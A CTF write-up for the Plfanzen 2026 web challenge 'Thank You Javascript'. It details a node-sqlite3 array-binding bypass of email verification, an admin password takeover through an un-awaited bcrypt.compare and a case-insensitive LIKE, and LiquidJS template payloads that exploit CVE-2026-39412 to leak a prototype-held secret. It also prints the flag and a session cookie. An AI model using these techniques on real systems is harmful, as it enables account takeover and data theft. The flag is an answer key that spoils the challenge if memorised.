+++
type               = "ctf"
title              = "Thank You Javascript"
description        = "Abusing node-sqlite3 array-binding parameter pollution and LiquidJS sort_natural's prototype-leaking sort-order side-channel (CVE-2026-39412) to exfiltrate a flag hidden on a class prototype"
author             = "conflict"
date               = "2026-05-10"
language           = "en"
tags               = ["web", "web-server", "logic bug", "liquidjs"]
event              = "Plfanzen 2026"
category           = "web"
difficulty         = "medium"
solves             = 35
challenge_author   = ["Jorian"]
challenge_author_url = ["https://jorianwoltjer.com/"]
rating             = 8.5
flag               = "plfanzen{w1th_4n_4rr4y_0f_3xpl01ts_1_pr0m1s3_y0u_w1ll_l1k3_th1s_s0rt_0f_th1ng}"
references         = ["https://github.com/advisories/GHSA-rv5g-f82m-qrvv", "https://liquidjs.com/filters/group_by_exp.html"]
+++

# Introduction

Thank You Javascript was a web challenge from the Plfanzen 2026 CTF. They took the initiative to make two separate scoreboards, a LLM-assisted bracket and a human bracket. I think this is a great thing to do, and allows people to have fun with or without AI. I chose to not use AI for this challenge as I don't think there is really any point in it, plus an AI would probably solve it in a few minutes.

The challenge has an app which is a homage to the beauty of a language that is JavaScript. The website has a bunch of functionalities that we will cover later, but the goal is to get the flag that is stored in every instance of the `Flag` class.

# TLDR

Register an account `ADMIN` with `email` submitted as an array. `node-sqlite3`'s array-binding shift leaves the `verification_code` placeholder unbound, so SQLite defaults it to `NULL` and the account is logged-in-ready. Once authenticated, `/update-password` rewrites the real admin's password thanks to a missing await on `bcrypt.compare` (Promise always truthy) combined with a case-insensitive `LIKE` lookup that returns the original admin row. Then abuse *CVE-2026-39412* on `/debug-template` to exfiltrate the prototype-hidden flag through a `sort_natural` sorting side-channel.

# Application Overview

The app is made using express and is rather simple, it doesn't really have any meaningful functionality. When started, the database is initialized and an `admin` user is created with a random (strong) password.
```javascript
if (!await db.getAsync("SELECT * FROM users WHERE username = ?", "admin")) {
    const admin_password = crypto.randomBytes(16).toString("hex");
    console.log(`Admin password: ${admin_password}`);
    const admin_password_hash = await bcrypt.hash(admin_password, 10);
    db.run("INSERT INTO users (email, username, password_hash) VALUES (?, ?, ?)", "admin@admin.com", "admin", admin_password_hash);
}
```

The app exposes endpoints to register, log in, logout and verify the account. When registering, we need to verify our account by sending the verification code to `/verify?code=`:
```javascript
app.get("/verify", (req, res) => {
    const { code } = req.query;
    if (!code) {
        return res.status(400).send("Code is required");
    }
    const user = db.prepare("SELECT * FROM users WHERE verification_code = ?").get(code);
    if (!user) {
        return res.status(400).send("Invalid code");
    }
    db.prepare("UPDATE users SET verification_code = NULL WHERE verification_code = ?").run(code);
    res.redirect("/login");
});
```

The verification code comes from the `/register` handler, which generates it like so:
```javascript
const verification_code = crypto.randomBytes(16).toString("hex");
const password_hash = await bcrypt.hash(password, 10);
await db.runAsync("INSERT INTO users (email, username, password_hash, verification_code) VALUES (?, ?, ?, ?)", email, username, password_hash, verification_code);
```

There is no way for us to know the verification code that has been generated, and thus no way to verify our account.

The other interesting endpoint is `/update-password`, it allows us to update our password by providing the old password and the new one we want, and it doesn't require to have a verified account to do so.

Finally, there is a `/debug-template` endpoint which is the last step of the challenge and is reserved to the admin user:
```javascript
app.get("/debug-template", (req, res) => {
    if (!res.locals.user?.is_admin) {
        return res.status(403).send("You must be admin to debug templates");
    }
    res.render("debug-template");
});
app.post("/debug-template", async (req, res) => {
    if (!res.locals.user?.is_admin) {
        return res.status(400).send("You must be admin to debug templates");
    }
    const template = req.body.template;
    const flag = new Flag();
    const html = await liquid.parseAndRender(template, { flag });
    res.send(html);
});
```

When submitting a template, an instance of `Flag` is passed to `liquidJS` for rendering. One thing is worth noting here:
We can't just access the value of the flag, as it's stored in the prototype but `liquidJS` has `ownPropertyOnly: true` by default, which means that any access to values of an object will **not** walk the prototype chain, so `flag.name` would return `undefined` as it exists in the prototype but not the actual object that is passed.

It's also worth noting that the only version that is pinned in the package is the `liquidJS` version, which hints that we will probably have to use a CVE for this last step.
```json
{
  "type": "module",
  "scripts": {
    "start": "node index.js"
  },
  "dependencies": {
    "bcrypt": "^6.0.0",
    "express": "^5.2.1",
    "express-session": "^1.19.0",
    "liquidjs": "10.25.3",
    "sqlite3": "^6.0.1"
  }
}
```

# Becoming the admin

## Please update your password!

Since `/debug-template` is our goal, we need to find a way to become admin. There are two vulnerabilities in `/update-password` that will help us, first, let's look at how the app verifies that the `old_password` is valid:
```javascript
if (bcrypt.compare(old_password, user.password_hash)) {
    const new_password_hash = await bcrypt.hash(new_password, 10);
    await db.runAsync("UPDATE users SET password_hash = ? WHERE id = ?", new_password_hash, user.id);
    res.redirect("/");
} else {
    return res.status(400).send("Wrong old password");
}
```

Here it's using `bcrypt.compare()` to validate the provided password against `user.password_hash` inside an *if* statement. 

If we take a look at how this function works from `bcrypt.js`'s source code, we can see that it is an **asynchronous function** that returns a **Promise**

[node.bcrypt.js/bcrypt.js](https://github.com/kelektiv/node.bcrypt.js/blob/24aa3c50a990db8cea4f545cd21b8740ea0364ea/bcrypt.js#L177)
```javascript
/// compare raw data to hash
/// @param {String|Buffer} data the data to hash and compare
/// @param {String} hash expected hash
/// @param {Function} cb callback(err, matched) - matched is true if hashed data matches hash
function compare(data, hash, cb) {
    let error;

    <...>

    // cb exists but is not a function
    // return a rejecting promise
    if (cb && typeof cb !== 'function') {
        return promises.reject(new Error('cb must be a function or null to return a Promise'));
    }

    if (!cb) {
        return promises.promise(compare, this, [data, hash]);
    }

    <...>

    return bindings.compare(data, hash, cb);
}
```

Here, the absence of an `await` operator will result in a **Promise** that is always truthy, so that condition will be `True` no matter what password we specify.

The second vulnerability lies in the way the app gets the target user for the password change:
```javascript
const user = await db.getAsync("SELECT * FROM users WHERE username LIKE ?", username);
```

Instead of making a strict comparison, it is using a `LIKE` statement, which means we can make the app retrieve the `admin` user instead of ours if our username is `ADMIN`, because `sqlite`'s `LIKE` is case-insensitive and `get()` returns the first hit in *ROWID* order.

To sum up, if we are logged in as `ADMIN` and request a password reset, we can reset the actual admin's password and then login to his account. Let's take a look at the register logic as there is one more step before we can actually do that.

## Hijacking the SQL Query

Because this app is very safe, a newly created account needs to be verified in order to login:
```javascript
app.post("/login", async (req, res) => {
    const { email, password } = req.body;
    if (!email || !password) {
        return res.status(400).send("All fields are required");
    }
    const user = await db.getAsync("SELECT * FROM users WHERE email = ?", email);
    if (!user) {
        return res.status(400).send("Account not found");
    }
    if (user.verification_code !== null) {
        return res.status(400).send("This account is not verified yet. Check your email for a verification link.");
    }
    <...>
}
```

That means we need to find a way to get our account verified before we can try to update the password. Let's take a look at how `/register` works:
```javascript
app.post("/register", async (req, res) => {
    const { email, username, password } = req.body;

    if (!email || !username || !password) {
        return res.status(400).send("All fields are required");
    }
    if (!/^[a-zA-Z0-9]+$/.test(username)) {
        return res.status(400).send("Username can only contain letters and numbers");
    }

    const verification_code = crypto.randomBytes(16).toString("hex");
    const password_hash = await bcrypt.hash(password, 10);
    await db.runAsync("INSERT INTO users (email, username, password_hash, verification_code) VALUES (?, ?, ?, ?)", email, username, password_hash, verification_code);
    // TODO: send email with verification_code
    res.redirect("/login");
});
```

Here we can see that the app never checks for the types of the values passed into the body. This means that we could have `email` set to an array, and the app would accept it and pass it to `db.runAsync()`.

And with the `sqlite3` npm package (node-sqlite3), when an array is passed as the first parameter for a prepared query, the arguments are expanded automatically into the query and the other args are ignored:

[node-sqlite3/src/statement.cc](https://github.com/TryGhost/node-sqlite3/blob/master/src/statement.cc#L223)
```c++
template <class T> T* Statement::Bind(const Napi::CallbackInfo& info, int start, int last) {
    <...>

    auto *baton = new T(this, callback);

    if (start < last) {
        if (info[start].IsArray()) {
            auto array = info[start].As<Napi::Array>();
            int length = array.Length();
            // Note: bind parameters start with 1.
            for (int i = 0, pos = 1; i < length; i++, pos++) {
                baton->parameters.emplace_back(BindParameter((array).Get(i), i + 1));
            }
        }
        else if (!info[start].IsObject() || OtherInstanceOf(info[start].As<Object>(), "RegExp") 
                || OtherInstanceOf(info[start].As<Object>(), "Date") || info[start].IsBuffer()) {
            // Parameters directly in array.
            // Note: bind parameters start with 1.
            for (int i = start, pos = 1; i < last; i++, pos++) {
                baton->parameters.emplace_back(BindParameter(info[i], pos));
            }
        }
        else if (info[start].IsObject()) {
            <...>
        }
        else {
            return NULL;
        }
    }

    return baton;
}
```

This means that if we pass three values in the `email` array, the first will be the actual `email`, the second will be the `username` and the third will be the `password_hash`, and all the other parameters will be ignored. In that scenario, the `verification_code` is never inserted in the DB because its placeholder `?` is left unbound and it defaults to `NULL`, giving us access to the account.

> Note: SQLite's UNIQUE constraint uses BINARY collation by default (case-sensitive), so ADMIN and admin are different keys. UNIQUE only complains for byte-identical duplicates, while LIKE ignores case.

# Templating to get the flag

Now that we have reset the admin's password and we can login to his account, we have access to `/debug-template`. As its name suggests, this endpoint allows us to render arbitrary `liquidJS` templates on the server, with an instance of the `Flag` class passed as an argument.

## CVE-2026-39412

Earlier, I talked about the `liquidJS` version, and it's time to take a look at what CVEs exist for this version.

[CVE-2026-39412](https://github.com/advisories/GHSA-rv5g-f82m-qrvv)'s full title is **ownPropertyOnly bypass via sort_natural filter — prototype property information disclosure through sorting side-channel**. This is exactly the kind of vulnerability we need to extract the flag: a way to read values from the prototype of an object.

This vulnerability is caused by the fact that the `sort_natural` filter accesses object properties using the bracket notation, which is the normal way to do so in Javascript but which also walks the prototype chain, allowing access to restricted values.

```javascript
export function sort_natural<T> (this: FilterImpl, input: T[], property?: string) {
  const propertyString = stringify(property)
  const compare = property === undefined
    ? caseInsensitiveCompare
    : (lhs: T, rhs: T) => caseInsensitiveCompare(lhs[propertyString], rhs[propertyString])
  const array = toArray(input)
  this.context.memoryLimit.use(array.length)
  return [...array].sort(compare)
}
```

![meme.png](https://i.imgflip.com/arfuyf.jpg)

There is no check at all for the `ownPropertyOnly` config, if we look at the advisory's PoC script, we can see it is very similar to our situation:
```javascript
const { Liquid } = require('liquidjs');

async function main() {
  const engine = new Liquid({ ownPropertyOnly: true });

  // Object with prototype-inherited secret
  function UserModel() {}
  UserModel.prototype.apiKey = 'sk-1234-secret-token';

  const target = new UserModel();
  target.name = 'target';

  const probe_a = { name: 'probe_a', apiKey: 'aaa' };
  const probe_z = { name: 'probe_z', apiKey: 'zzz' };

  // Direct access: correctly blocked by ownPropertyOnly
  const r1 = await engine.parseAndRender('{{ users[0].apiKey }}', { users: [target] });
  console.log('Direct access:', JSON.stringify(r1));  // "" (blocked)

  // map filter: correctly blocked
  const r2 = await engine.parseAndRender('{{ users | map: "apiKey" }}', { users: [target] });
  console.log('Map filter:', JSON.stringify(r2));  // "" (blocked)

  // sort_natural: BYPASSES ownPropertyOnly
  const r3 = await engine.parseAndRender(
    '{% assign sorted = users | sort_natural: "apiKey" %}{% for u in sorted %}{{ u.name }},{% endfor %}',
    { users: [probe_z, target, probe_a] }
  );
  console.log('sort_natural order:', r3);
  // Output: "probe_a,target,probe_z,"
  // If apiKey were blocked: original order "probe_z,target,probe_a,"
  // Actual: sorted by apiKey value (aaa < sk-1234-secret-token < zzz)
}

main();
```

Their output shows that the API key is between `aaa` and `zzz`, but the advisory also states: "**By using more precise probe values, the full secret can be extracted character-by-character through binary search.**"

And that is exactly what we need to do. Unlike the PoC, we can't write JS to construct probe objects, we only control the template body. So we need a way to manufacture, from within the template, objects whose `.name` we control.

## group_by and group_by_exp

`liquidJS` has quite a lot of functions we can use, but [group_by](https://liquidjs.com/filters/group_by.html) and [group_by_exp](https://liquidjs.com/filters/group_by_exp.html) seem to be the most promising ones for our situation. As the documentation says, these functions allow to **Group an array’s items using a Liquid expression or a given property**.

But even more interesting, the output of these functions is formatted like so:
```json
[
  {
    "name": 2003,
    "items": [
      {
        "graduation_year": 2003,
        "name": "Jay"
      },
      {
        "graduation_year": 2003,
        "name": "John"
      }
    ]
  },
  {
    "name": 2004,
    "items": [
      {
        "graduation_year": 2004,
        "name": "Jack"
      }
    ]
  }
]
```

It has `name` properties whose values we control because they are taken from the source array. This is exactly what we need to reproduce the CVE's PoC.

> Note: To debug LiquidJS's behavior and craft the exploit template, I used https://liquidjs.com/playground.html

To extract the flag, the idea is to first create a list which will be the charset. I have found no direct way to create a list with `liquidJS`, so we will use a string and split it:
```
{% assign chars = '0,1,2,3,4,5,6,7,8,9,_,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,}' | split: ',' %}
```

We then make a "probe" object using the `group_by_exp` function to have a list which has each char as a name:
```
{% assign probes = chars | group_by_exp: 'char', "'' | append: char" %}
```

Here, using `group_by_exp` instead of `group_by` will allow us to quickly test for the next char by adding the already known chars into the expression like so:
```
{% assign probes = chars | group_by_exp: 'char', "'plfanzen{' | append: char" %}
```

Then, the next steps are simpler: we create a list that has both the probes and the flag object then sort that list. Finally, render each element's `items` field. `group_by_exp` populates `items` with the originals that produced each group's key, so for our single-char inputs each row prints the char we tested.
```
{% assign all = probes | push: flag %}
{% assign sorted = all | sort_natural: 'name' %}
{% for x in sorted %}|{{ x.items }}{% endfor %}|
```

The output will look like this:
```terminal
|0|1|2|3|4|5|6|7|8|9|_|a|b|c|d|e|f||g|h|i|j|k|l|m|n|o|p|q|r|s|t|u|v|w|x|y|z|}| 
```

Because `Flag` has no `.items` field no character is returned, but it is enough to spot where it got sorted in the list, as the place where there is `||` is where `Flag` is. We now just have to take the character that comes before it, and repeat that until the end of the flag, adding the known characters into the `group_by_exp` expression each time.

![meme.gif](https://i.imgflip.com/arfvks.gif)

```terminal
plfanzen2026/web/thank_you_javascript $ python3 solve.py
Registered user
Logged in
Updated password
Logged out
Logged in as admin
Admin cookie:  s%3ALPBYUUSs3Ipbh5BPTTm1vKx3eBG3GQkR.iItxxzwQojjEgj5XIUQI%2FxhMhpsfUAW08RCcn2UcME8
Flag: plfanzen{w1th_4n_4rr4y_0f_3xpl01ts_1_pr0m1s3_y0u_w1ll_l1k3_th1s_s0rt_0f_th1ng}
```

# Conclusion

This challenge was really fun, a great mix of "it's a feature, not a bug" and CVE research, thanks to Jorian and the Plfanzen team!